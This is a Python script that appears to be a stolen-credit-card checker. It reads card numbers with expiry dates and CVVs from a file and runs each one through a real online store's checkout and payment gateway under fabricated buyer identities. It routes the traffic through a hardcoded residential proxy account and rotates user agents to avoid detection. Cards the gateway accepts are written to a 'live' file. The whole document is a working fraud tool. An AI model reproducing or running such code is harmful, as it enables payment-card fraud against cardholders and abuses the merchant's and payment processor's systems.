import random, time, requests
from faker import Faker
from random import choice
#from curl_cffi import requests
from colorama import init, Fore
from fake_useragent import UserAgent
from urllib.parse import quote, unquote


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None


def ccn_gate(card):
    #print(card)
    max_retries = 25
    retry_count = 0
    while retry_count < max_retries:
        try:
            init(autoreset=True)
            #tiempo_espera = time.sleep(5)
            #============[Funcions Need]============#
            cliente = requests.Session()
            cliente.proxies = {"https": "http://TeslaProxy:TESLA525@geo.iproyal.com:12321"}
            cliente.verify  = False
            cliente.timeout = 100
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            mes = mes.zfill(2)
            agente_user = UserAgent().random
            resp_live = ["Zero+Dollar+Auth+Approval"]
            resp_ccn  = ["Decline:+CV2+FAIL"]

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name}+street+{number}"
            phone = usuario()['phone']

            #============[Requests 1]============#
            headers = {"User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"}
            respons = cliente.get(url="https://www.wehrsmachine.com/item/5173297-10-spring-steel-body-strap", headers=headers)
            _token_ = capture(respons.text, 'name="_token" type="hidden" value="', '"')
            #print(_token_)

            #============[Requests 2]============#
            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://www.wehrsmachine.com","Referer": "https://www.wehrsmachine.com/item/5173297-10-spring-steel-body-strap"}
            data    = f"_token={_token_}&item_id=5173297&quantity=1"
            respons = cliente.post(url="https://www.wehrsmachine.com/ajax/addtocart", data=data, headers=headers)
            #print(2)
            #============[Requests 3]============#
            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://www.wehrsmachine.com","Referer": "https://www.wehrsmachine.com/order?"}
            data    = f"action=set_address&email_address={quote(email)}&ship_to_first_name={name}&ship_to_last_name={last}&ship_to_phone={phone}&ship_to_company=None&ship_to_address1={street}&ship_to_address2=&ship_to_city=NY&ship_to_state=NY&ship_to_zip=10080&ship_to_country=US"
            respons = cliente.post(url="https://www.wehrsmachine.com/order/update", data=data, headers=headers)
            #print(3)
            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://www.wehrsmachine.com","Referer": "https://www.wehrsmachine.com/order?"}
            data    = f"action=set_shipping&ship_service=ups_oauth_01_da39a3ee5e6b4b0d3255bfef95601890afd80709"
            respons = cliente.post(url="https://www.wehrsmachine.com/order/update", data=data, headers=headers)
            #print(4)
            #============[Requests 4]============#
            headers = {"User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Referer": "https://www.wehrsmachine.com/order?"}
            respons = cliente.get(url="https://www.wehrsmachine.com/order/view/add-payment", headers=headers)
            token_p = capture(respons.text, 'paypage/', '"')
            #print(token_p)

            #============[Requests 5]============#
            headers = {"Origin": "https://ee.paygateway.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Referer": respons.url}
            data    = f"trackdata_check_interval_ms=500&auto_submit_flag=false&order_description=&invoice_number=&purchase_order_number=&expire_month_display={int(mes)}&expire_year_display={ano_number}&expire_month={int(mes)}&expire_year={ano_number}&credit_card_verification_number=&credit_card_number={cc_number}&billing_customer_title=&billing_first_name={name}&billing_middle_name=&billing_last_name={last}&billing_company=None&billing_address_one={street}&billing_address_two=&billing_city=NY&billing_country_code=US&billing_state_or_province=NY&billing_postal_code=10080&billing_email=&billing_phone=&billing_note=&clerk_id=&shipping_address_one=&shipping_address_two=&shipping_date=&shipping_postal_code=&createAliasHidden=true&createAlias=true&user_defined_one=&user_defined_two=&user_defined_three="
            respons = requests.post(url=respons.url, data=data, headers=headers)
            result_ = capture(respons.text, 'id="returnUrl" value="', '"')
            message = capture(unquote(result_), '<RESPONSEDESCRIPTION>', '</RESPONSEDESCRIPTION>')

            if message in resp_live:
                file_saved = open('live.txt', 'a') 
                file_saved.write(f"{cc_number}|{mes}|{ano_number}|{cvv} - valid\n")
                print(Fore.GREEN + f"{cc_number}|{mes}|{ano_number}|{cvv}|approved|verified|")
                return card
            elif message in resp_ccn:
                print(Fore.GREEN + f"{cc_number}|{mes}|{ano_number}|{cvv}|approved|{message}|")
                return card
            elif "Invalid+Reference+Error:+Duplicate+OrderID+sent" in message:
                retry_count += 1
            else:
                print(Fore.RED + f"{cc_number}|{mes}|{ano_number}|{cvv}|declined|{message}|")
                return card
            
        except Exception as e:
            #print(e)
            retry_count += 1
    else:
        print(Fore.YELLOW + f"{cc_number}|{mes}|{ano_number}|{cvv}|error|retries_fail|")
        return card


if __name__ == "__main__":
    time.sleep(6)
    file = open('cards.txt', 'r')
    lines = file.readlines()
    for position, x in enumerate(lines):
        cc, mes, ano, cvv = x.split("|")
        gateway = ccn_gate(f"{cc}|{mes}|{ano}|{cvv.strip()}")
        print(gateway)
        with open('cards.txt', "w")as f:
            f.writelines(lines[position+1:])
            f.close()